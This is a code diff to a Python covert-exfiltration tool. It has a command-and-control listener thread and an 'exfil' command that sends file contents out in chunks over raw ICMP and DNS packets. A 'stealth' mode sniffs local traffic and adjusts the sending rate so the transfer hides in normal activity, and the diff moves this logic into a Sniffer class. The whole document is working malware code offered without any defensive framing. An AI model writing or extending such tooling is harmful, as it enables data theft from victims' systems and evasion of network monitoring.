@@ -43,8 +43,6 @@ icmpOnly    = False
 dnsOnly     = False
 mixedOnly   = False
 
-monitorThread = None
-
 bindAddress = "127.0.0.1"
 dstAddress  = "127.0.0.1"
 bindPort    = 1337
@@ -54,7 +52,7 @@ receiveSocket   = None
 sendICMPSocket  = None
 sendDNSSocket   = None
 
-pktCount = 0
+sniffer = None
 
 class ICMPPacket:
     def __init__(self, type, code, data):
@@ -63,6 +61,7 @@ class ICMPPacket:
         self.data = data
 
     def computeChecksum():
+        # TODO
         pass
     
     def getHeader(self):
@@ -81,6 +80,7 @@ class DNSPacket:
         self.QR = 0
 
     def computeChecksum():
+        # TODO
         pass
         
     def getHeader(self, length):
@@ -99,16 +99,53 @@ class DNSPacket:
 
         print("Total packet length: %d" % length)
         return header + self.data + end
- 
+
+class Sniffer:
+    intervalTime = 10
+    capturing = True
+    captureLength = 10
+    timeBetweenListens = 5
+    count = 0
+    packetsInLastInterval = 0
+    thread = None
+
+    def __init__(self):
+        self.thread = threading.Thread(None, self.monitorNetwork)
+        self.thread.start()
+        
+
+    def monitorNetwork(self):
+        
+        # Start receiving of packets. Sniff on all interfaces
+        # while not completedTransfer
+        while True:
+            print("Starting sniffing for {} seconds...".format(self.captureLength))
+            sniff(prn=self.receive, timeout=self.captureLength)
+            print("Received {} packets in {} seconds\n".format(self.count, self.captureLength))
+            self.packetsInLastInterval = self.count
+            self.count = 0
+            #time.sleep(timeBetweenListens)
+
+    def receive(self, data):
+        # Callback for sniffed packets
+        self.count += 1
+
+    def getLastPacketCount(self):
+        return self.packetsInLastInterval
+
+# Utility functions
+def roundUp(x, base=4):
+    return int(math.ceil(x / base)) * base
+
+def zeroCount():
+    global pktCount
+
+    pktCount = 0
+
 def main():
     init()
     #parseCommand("exfil -f -d secretdoc1.txt")
 
-# callback for received packets
-def recv_pkts(data):
-    global pktCount
-
-    pktCount += 1
 
 def init():
     global exfilBytes
@@ -120,28 +157,24 @@ def init():
     global pktCount
     workingDirectory = os.getcwd()
 
-    # TODO: Move socket initialisations into here and handle exceptions
+    # TODO: Ensure sockets were initialised successfully
     receiveSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     receiveSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     receiveSocket.bind((bindAddress, bindPort))
 
-    sendICMPSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
-    sendDNSSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
+    sendICMPSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_PROTOCOL)
+    sendDNSSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, UDP_PROTOCOL)
 
     # Start C2 thread
     receiveThread = threading.Thread(None, receiveCommands)
     receiveThread.start()
 
-def zeroCount():
-    global pktCount
-
-    pktCount = 0
-
 def receiveCommands():
     while True:
-        print("Listening")
+        print("Listening...")
+        # TODO: Don't assume commands are less than 1024 bytes
         data,addr = receiveSocket.recvfrom(1024)
-        print("Received command...")
+        print("Received command")
         command = data[13:-5].decode()
         parseCommand(command)
 
@@ -154,6 +187,7 @@ def parseCommand(cmd):
     global mixedOnly
     global currentFilePath
     global workingDirectory
+    global sniffer
 
     cmd = cmd.split(' ')
     print("Command: {}".format(cmd))
@@ -169,6 +203,7 @@ def parseCommand(cmd):
                     output += "\n".encode()
             sendDataLoop(output)
         except Exception as e:
+            sendEndOfTransmission()
             print(e)
 
     elif cmd[0] == "remcd":
@@ -234,15 +269,13 @@ def parseCommand(cmd):
         print("args.pps: " + str(args.pps))
         if not(args.stealth | args.fast | bool(args.pps)):
             print("Using default mode: stealth")
-            print("args.pss: " + str(args.pps))
             args.stealth = True
         if not(args.icmp | args.dns | args.mixed):
             args.mixed = True
 
         if args.stealth:  
             # If stealth mode is on then start network monitoring
-            monitorThread = threading.Thread(None, monitorNetwork)
-            monitorThread.start()
+            sniffer = Sniffer()
 
         # Set option variables 
         if args.pps != None:
@@ -281,30 +314,24 @@ def sendFileLoop():
         print("Error: " + str(e))
         return
 
-    if stealthMode:
-        if updatedPPI == 0:
-            delay = 100
-        else:
-            k = 48 # Constant of proporionality between delay and ppi
-            localPPI = updatedPPI
-            delay = k / localPPI
-    elif ppsMode[0]:
+    k = 48 # Arbitrary constant for delay scaling
+    ppi = 0
+
+    if ppsMode[0]:
         delay = 1/ppsMode[1]
 
     # While the whole file hasn't be exfiltrated
     while startByte < (len(exfilBytes) - 1):
         # Update delay based on network listener data
         if stealthMode:       
-            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
-            # If the monitor has updated the PPI value, then update the delay between packets
-            if localPPI != updatedPPI:
-                print("Updating delay")
-                if updatedPPI == 0:
-                    delay = 100
-                else:
-                    localPPI = updatedPPI
-                    delay = k/localPPI
-                print("New delay: %f" % (delay))        
+            ppi = sniffer.getLastPacketCount()
+            # Update delay
+            if ppi == 0:
+                delay = 100
+            else:
+                delay = k/ppi 
+            print("ppi: {}".format(ppi))
+            
 
         # Send next chunk
         nextPacketType = getNextPacketType()
@@ -449,13 +476,7 @@ def getNextChunk(sb, cl):
     # TODO: Check speed of splicing vs. constructing with a for loop
     #chunk = exfilBytes[sb : sb + cl]
     startByte += cl
-    return chunk
-
-def sendStartOfFile():
-    pass
-    
-def roundUp(x, base=4):
-    return int(math.ceil(x / base)) * base
+    return chunk 
 
 def sendEndOfTransmission():
     nextType = getNextPacketType()
@@ -509,25 +530,6 @@ def closeAllSockets():
         sendDNSSocket.close()
     except e:
         print(e)
-
-intervalTime = 10
-capturing = True
-captureLength = 10
-timeBetweenListens = 5
-
-def monitorNetwork():
-    global capturing
-    global updatedPPI
-    
-    # Start receiving of packets. Sniff on all interfaces
-    # while not completedTransfer
-    while True:
-        print("Starting sniffing for 5 seconds...")
-        sniff(prn=recv_pkts, timeout=captureLength)
-        print("Received {} packets in {} seconds\n".format(pktCount, captureLength))
-        updatedPPI = pktCount
-        zeroCount()
-        #time.sleep(timeBetweenListens)
 
 if __name__ == "__main__":
     main()
